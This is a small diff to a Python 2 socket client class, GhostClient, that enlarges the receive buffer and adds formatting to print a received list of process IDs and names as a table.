@@ -15,7 +15,7 @@ class GhostClient():
     self.sock.close()
 
   def recieve(self):
-    self.stream = self.sock.recv(1024)
+    self.stream = self.sock.recv(4096)
   
   def send(self, msg):
     self.sock.send(msg)
@@ -28,7 +28,15 @@ class GhostClient():
     return msg
 
   def parseStream(self):
-    print self.stream
+    splitted = self.stream.split(',')
+    if(len(splitted) == 1):
+      print self.stream
+    else:
+      #So it's a list of pids !
+      print "PID      Name"
+      for p in splitted:
+        ps = p.split('|')
+        print "%s      %s" %(ps[0], ps[1])
 
   def command_forever(self):
     self.connect()
